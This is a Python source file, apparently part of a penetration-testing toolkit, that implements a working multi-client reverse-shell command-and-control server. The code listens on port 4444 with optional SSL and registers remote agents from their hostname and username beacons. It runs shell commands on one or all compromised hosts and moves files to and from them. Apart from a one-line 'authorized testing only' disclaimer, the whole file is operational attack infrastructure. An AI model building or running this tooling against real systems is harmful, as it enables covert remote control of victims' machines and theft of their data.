from core.worker import BaseWorker
"""
modules/c2_server.py — Multi-client reverse shell C2 handler.
TCP listener with SSL support, session management, file transfer.
For authorized penetration testing only.
"""

import json
import os
import select
import socket
import ssl
import struct
import threading
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional


from core.logger import get_logger

log = get_logger("c2_server")

# ── Protocol constants ─────────────────────────────────────────────────────────
_HDR_FMT  = ">I"          # 4-byte big-endian unsigned int for message length
_HDR_SIZE = struct.calcsize(_HDR_FMT)
_CMD_TIMEOUT   = 10        # seconds to wait for a command response
_RECV_BUF      = 4096      # socket receive buffer size
_FILE_CHUNK    = 8192      # chunk size for file transfers


# ──────────────────────────────────────────────────────────────────────────────
# Low-level protocol helpers
# ──────────────────────────────────────────────────────────────────────────────

def _send_msg(sock: socket.socket, payload: dict) -> None:
    """Encode payload as JSON, prefix with 4-byte length, send over sock."""
    data = json.dumps(payload).encode("utf-8")
    header = struct.pack(_HDR_FMT, len(data))
    sock.sendall(header + data)


def _recv_msg(sock: socket.socket, timeout: float = _CMD_TIMEOUT) -> Optional[dict]:
    """
    Read one length-prefixed JSON message from sock.
    Returns parsed dict or None on error/timeout.
    """
    sock.settimeout(timeout)
    try:
        # Read the 4-byte header
        raw_len = b""
        while len(raw_len) < _HDR_SIZE:
            chunk = sock.recv(_HDR_SIZE - len(raw_len))
            if not chunk:
                return None
            raw_len += chunk

        (msg_len,) = struct.unpack(_HDR_FMT, raw_len)

        # Guard against absurdly large messages (100 MB cap)
        if msg_len > 100 * 1024 * 1024:
            log.warning("_recv_msg: message length %d exceeds 100 MB cap", msg_len)
            return None

        # Read the JSON body
        raw_body = b""
        while len(raw_body) < msg_len:
            chunk = sock.recv(min(_RECV_BUF, msg_len - len(raw_body)))
            if not chunk:
                return None
            raw_body += chunk

        return json.loads(raw_body.decode("utf-8"))
    except (socket.timeout, OSError, json.JSONDecodeError, struct.error):
        return None
    finally:
        sock.settimeout(None)


# ──────────────────────────────────────────────────────────────────────────────
# C2Session
# ──────────────────────────────────────────────────────────────────────────────

class C2Session:
    """
    Represents a single connected reverse-shell session.
    Thread-safe: all socket I/O is protected by self._lock.
    """

    def __init__(self, conn: socket.socket, addr: tuple):
        self.id           = str(uuid.uuid4())[:8]   # short UUID for display
        self.addr         = addr
        self.conn         = conn
        self.connected_at = datetime.now()
        self.last_seen    = datetime.now()
        self.os_info      = "unknown"
        self.hostname     = "unknown"
        self.username     = "unknown"
        self.pid          = 0
        self._lock        = threading.Lock()
        self._alive       = True

    # ── Public API ────────────────────────────────────────────────────────────

    def send_command(self, cmd: str) -> str:
        """
        Send a shell command to the remote agent and return its output string.
        Returns an error string prefixed with '[ERROR]' on failure.
        """
        with self._lock:
            if not self._alive:
                return "[ERROR] session is closed"
            try:
                _send_msg(self.conn, {"type": "exec", "cmd": cmd})
                resp = _recv_msg(self.conn, timeout=_CMD_TIMEOUT)
                if resp is None:
                    self._alive = False
                    return "[ERROR] no response (session may have died)"
                self.last_seen = datetime.now()
                return resp.get("output", "")
            except OSError as exc:
                self._alive = False
                return f"[ERROR] socket error: {exc}"

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """
        Read local_path and transfer its contents to remote_path on the agent.
        Returns True on success, False on any error.
        """
        try:
            data = Path(local_path).read_bytes()
        except OSError as exc:
            log.error("upload_file: cannot read %s: %s", local_path, exc)
            return False

        with self._lock:
            if not self._alive:
                return False
            try:
                _send_msg(self.conn, {
                    "type":        "upload",
                    "remote_path": remote_path,
                    "size":        len(data),
                    "data":        data.hex(),   # hex-encode binary for JSON transport
                })
                resp = _recv_msg(self.conn, timeout=30)
                if resp and resp.get("status") == "ok":
                    self.last_seen = datetime.now()
                    return True
                return False
            except OSError as exc:
                self._alive = False
                log.error("upload_file: socket error: %s", exc)
                return False

    def download_file(self, remote_path: str, local_path: str) -> bool:
        """
        Request remote_path from the agent and save it to local_path.
        Returns True on success, False on any error.
        """
        with self._lock:
            if not self._alive:
                return False
            try:
                _send_msg(self.conn, {"type": "download", "remote_path": remote_path})
                resp = _recv_msg(self.conn, timeout=30)
                if resp is None or resp.get("status") != "ok":
                    return False
                raw = bytes.fromhex(resp.get("data", ""))
                Path(local_path).parent.mkdir(parents=True, exist_ok=True)
                Path(local_path).write_bytes(raw)
                self.last_seen = datetime.now()
                return True
            except (OSError, ValueError) as exc:
                self._alive = False
                log.error("download_file: error: %s", exc)
                return False

    def close(self) -> None:
        """Gracefully close the session socket."""
        self._alive = False
        try:
            _send_msg(self.conn, {"type": "exit"})
        except Exception:
            pass
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.conn.close()
        except Exception:
            pass
        log.info("C2Session %s closed (%s:%d)", self.id, *self.addr)

    @property
    def is_alive(self) -> bool:
        return self._alive

    def __repr__(self) -> str:
        return (
            f"<C2Session id={self.id} addr={self.addr[0]}:{self.addr[1]} "
            f"host={self.hostname} user={self.username} alive={self._alive}>"
        )


# ──────────────────────────────────────────────────────────────────────────────
# _AcceptWorker — QThread that runs the accept loop
# ──────────────────────────────────────────────────────────────────────────────

class _AcceptWorker(BaseWorker):
    """
    Runs in a background QThread.
    Calls back into C2Server via direct method calls (thread-safe via locks).
    """

    def __init__(self, server: "C2Server"):
        super().__init__()
        self._server = server

    def run(self) -> None:
        self._server._accept_loop()


# ──────────────────────────────────────────────────────────────────────────────
# C2Server
# ──────────────────────────────────────────────────────────────────────────────

class C2Server:
    """
    Multi-client reverse shell listener.

    Callbacks: on_connected(id, addr, port), on_disconnected(id),
               on_output(id, text), on_log(msg), on_error(msg)
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 4444,
                 use_ssl: bool = False,
                 on_connected=None, on_disconnected=None,
                 on_output=None, on_log=None, on_error=None):
        self._on_connected    = on_connected
        self._on_disconnected = on_disconnected
        self._on_output       = on_output
        self._on_log          = on_log
        self._on_error        = on_error
        self.host    = host
        self.port    = port
        self.use_ssl = use_ssl

        self._sessions: dict[str, C2Session] = {}   # id -> session
        self._sessions_lock = threading.Lock()

        self._server_sock: Optional[socket.socket] = None
        self._running = False
        self._worker: Optional[_AcceptWorker] = None

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    def start(self) -> None:
        """Bind the listen socket and start the background accept thread."""
        if self._running:
            self._safe_emit("server_log", "[C2] Server is already running.")
            return
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            raw_sock.bind((self.host, self.port))
            raw_sock.listen(32)
            raw_sock.setblocking(False)

            if self.use_ssl:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                # Caller is expected to have set certfile/keyfile via context
                # For lab use: generate self-signed cert externally and pass paths
                ctx_certfile = os.environ.get("C2_CERT", "c2_cert.pem")
                ctx_keyfile  = os.environ.get("C2_KEY",  "c2_key.pem")
                context.load_cert_chain(certfile=ctx_certfile, keyfile=ctx_keyfile)
                self._server_sock = context.wrap_socket(raw_sock, server_side=True)
            else:
                self._server_sock = raw_sock

            self._running = True
            self._worker  = _AcceptWorker(self)
            self._worker.start()

            msg = f"[C2] Listener started on {self.host}:{self.port}" + (
                " [SSL]" if self.use_ssl else ""
            )
            log.info(msg)
            self._safe_emit("server_log", msg)

        except OSError as exc:
            msg = f"[C2] Failed to start listener: {exc}"
            log.error(msg)
            self._safe_emit("error", msg)

    def _safe_emit(self, sig, *a):
        _CB_MAP = {
            "session_connected":    self._on_connected,
            "session_disconnected": self._on_disconnected,
            "command_output":       self._on_output,
            "server_log":           self._on_log,
            "error":                self._on_error,
        }
        fn = _CB_MAP.get(sig)
        if fn:
            try:
                fn(*a)
            except Exception:
                pass

    def stop(self) -> None:
        """Signal the accept loop to exit and close all sessions."""
        if not self._running:
            return
        self._running = False

        # Close all active sessions
        with self._sessions_lock:
            for sess in list(self._sessions.values()):
                sess.close()
            self._sessions.clear()

        # Close the server socket to unblock select()
        try:
            self._server_sock.close()
        except Exception:
            pass
        self._server_sock = None

        if self._worker and self._worker.is_alive():
            self._worker.join(3.0)
            self._worker = None

        log.info("[C2] Listener stopped.")
        self._safe_emit("server_log", "[C2] Listener stopped.")

    # ── Accept loop (runs in _AcceptWorker thread) ────────────────────────────

    def _accept_loop(self) -> None:
        """
        select()-based accept loop with 1-second timeout so stop() can signal
        clean shutdown by setting self._running = False.
        """
        while self._running:
            try:
                readable, _, _ = select.select([self._server_sock], [], [], 1.0)
            except Exception:
                break

            if not readable:
                continue

            try:
                conn, addr = self._server_sock.accept()
            except OSError:
                break

            # Perform handshake in a short-lived thread to avoid blocking the
            # accept loop while waiting for the agent's initial JSON beacon.
            t = threading.Thread(
                target=self._handshake,
                args=(conn, addr),
                daemon=True,
            )
            t.start()

    def _handshake(self, conn: socket.socket, addr: tuple) -> None:
        """
        Read initial JSON beacon from newly connected agent.
        Expected format:
            {"type": "hello", "os": "...", "hostname": "...", "username": "...", "pid": 1234}
        """
        try:
            beacon = _recv_msg(conn, timeout=10)
            if not beacon or beacon.get("type") != "hello":
                log.warning("_handshake: bad beacon from %s:%d — dropping", *addr)
                conn.close()
                return

            sess = C2Session(conn, addr)
            sess.os_info  = beacon.get("os",       "unknown")
            sess.hostname = beacon.get("hostname", "unknown")
            sess.username = beacon.get("username", "unknown")
            sess.pid      = int(beacon.get("pid", 0))

            # ACK the beacon
            _send_msg(conn, {"type": "hello_ack", "status": "ok"})

            with self._sessions_lock:
                self._sessions[sess.id] = sess

            msg = (f"[C2] New session {sess.id} from {addr[0]}:{addr[1]} "
                   f"— {sess.username}@{sess.hostname} ({sess.os_info})")
            log.info(msg)
            self._safe_emit("server_log", msg)
            self._safe_emit("session_connected", sess.id, addr[0], addr[1])

        except Exception as exc:
            log.error("_handshake error from %s: %s", addr, exc)
            try:
                conn.close()
            except Exception:
                pass

    # ── Command execution ─────────────────────────────────────────────────────

    def execute(self, session_id: str, command: str) -> None:
        """
        Send command to session and emit command_output(session_id, output).
        Runs in a background thread to avoid blocking the GUI.
        """
        def _worker():
            sess = self.get_session(session_id)
            if sess is None:
                self._safe_emit("command_output", session_id, f"[ERROR] Session {session_id} not found.")
                return
            output = sess.send_command(command)
            if not sess.is_alive:
                self._safe_emit("session_disconnected", session_id)
                with self._sessions_lock:
                    self._sessions.pop(session_id, None)
            self._safe_emit("command_output", session_id, output)

        t = threading.Thread(target=_worker, daemon=True)
        t.start()

    def broadcast(self, command: str) -> None:
        """Execute command on all active sessions."""
        with self._sessions_lock:
            active_ids = [sid for sid, s in self._sessions.items() if s.is_alive]
        for sid in active_ids:
            self.execute(sid, command)

    # ── Session management ────────────────────────────────────────────────────

    def get_sessions(self) -> list:
        """Return a list of all C2Session objects (active and dead)."""
        with self._sessions_lock:
            return list(self._sessions.values())

    def get_session(self, session_id: str) -> Optional[C2Session]:
        """Return the C2Session with the given id, or None."""
        with self._sessions_lock:
            return self._sessions.get(session_id)

    def disconnect_session(self, session_id: str) -> None:
        """Cleanly close and remove a session."""
        with self._sessions_lock:
            sess = self._sessions.pop(session_id, None)
        if sess:
            sess.close()
            self._safe_emit("session_disconnected", session_id)
            self._safe_emit("server_log", f"[C2] Session {session_id} disconnected.")

    # ── Properties ────────────────────────────────────────────────────────────

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def session_count(self) -> int:
        with self._sessions_lock:
            return len(self._sessions)


# ── Singleton ──────────────────────────────────────────────────────────────────

_c2_instance: Optional[C2Server] = None


def get_c2_server(host: str = "0.0.0.0", port: int = 4444,
                  use_ssl: bool = False) -> C2Server:
    """
    Return the process-wide C2Server singleton.
    If it does not exist yet, create it with the provided parameters.
    """
    global _c2_instance
    if _c2_instance is None:
        _c2_instance = C2Server(host=host, port=port, use_ssl=use_ssl)
    return _c2_instance
